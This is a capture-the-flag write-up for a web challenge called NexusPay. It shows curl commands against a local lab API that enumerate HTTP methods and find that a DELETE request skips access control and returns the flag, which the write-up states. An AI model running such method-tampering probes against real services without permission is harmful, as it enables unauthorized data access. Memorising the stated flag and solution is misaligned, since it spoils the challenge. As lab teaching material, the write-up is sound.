# 💳 NexusPay - Writeup

## Challenge Overview
**Name:** NexusPay - API Security Assessment  
**Category:** Web / HTTP Methods  
**Difficulty:** Easy-Medium  
**Flag:** `STELKCSC{http_m3th0ds_m4tt3r_1n_4p1s}`

## Solution Path

### 1. Initial Recon
```bash
# Visit dashboard
curl http://localhost:5005

# Check API docs  
curl http://localhost:5005/api/docs

# Test the endpoint
curl http://localhost:5005/api/v1/transactions/export
# Returns: 403 Forbidden
```

### 2. Method Enumeration
```bash
# Use OPTIONS to discover allowed methods
curl -X OPTIONS http://localhost:5005/api/v1/transactions/export -i
# Response header: Allow: GET, POST, PUT, DELETE, PATCH, OPTIONS
```

### 3. Test Each Method
```bash
# GET → 403 Forbidden
curl http://localhost:5005/api/v1/transactions/export

# POST → 401 Unauthorized (needs auth)
curl -X POST http://localhost:5005/api/v1/transactions/export

# PUT → 405 Method Not Allowed
curl -X PUT http://localhost:5005/api/v1/transactions/export

# PATCH → 405 Method Not Allowed  
curl -X PATCH http://localhost:5005/api/v1/transactions/export

# DELETE → 200 OK + FLAG!
curl -X DELETE http://localhost:5005/api/v1/transactions/export
```

### 4. Extract Flag
The DELETE response contains the flag in the `checksum` field:
```json
{
  "status": "success",
  "message": "Export completed",
  "data": {
    "export_id": "EXP-2024-00847",
    "checksum": "STELKCSC{http_m3th0ds_m4tt3r_1n_4p1s}"
  }
}
```

## Key Takeaways
- **Test ALL HTTP methods** - Not just GET and POST
- **OPTIONS reveals allowed methods** - Useful for recon
- **Access control must be consistent** - DELETE bypassed auth due to misconfiguration
